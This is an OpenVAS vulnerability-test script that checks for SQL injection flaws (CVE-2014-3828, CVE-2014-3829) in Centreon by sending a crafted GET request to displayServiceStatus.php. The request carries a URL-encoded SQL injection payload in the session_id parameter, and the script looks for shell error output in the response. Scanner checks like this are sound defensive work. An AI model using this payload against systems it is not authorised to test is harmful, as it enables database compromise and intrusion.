###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_centreon_70648.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Centreon and Centreon Enterprise Server Multiple SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:centreon:centreon";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105098");
  script_bugtraq_id(70648, 70649);
  script_cve_id("CVE-2014-3828", "CVE-2014-3829");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11867 $");

  script_name("Centreon and Centreon Enterprise Server Multiple SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70648");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70649");
  script_xref(name:"URL", value:"http://www.centreon.com/");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"Centreon fails to sufficiently sanitize user-supplied data.");
  script_tag(name:"solution", value:"Updates are available");

  script_tag(name:"summary", value:"Centreon and Centreon Enterprise Server are prone to multiple SQL-
injection vulnerabilities.");

  script_tag(name:"affected", value:"The following products are vulnerable:
Centreon 2.5.1 and prior versions
Centreon Enterprise Server 2.2 and prior versions");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-10-28 12:37:14 +0100 (Tue, 28 Oct 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("centreon_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("centreon/installed");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + '/include/views/graphs/graphStatus/displayServiceStatus.php?session_id=0%27%20or%201%3D1%20--%20%2F**%26index%3D1%27%20or%201%3D1%20--%20%2F**';

if( http_vuln_check( port:port, url:url, pattern:"sh: graph: command not found" ) )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
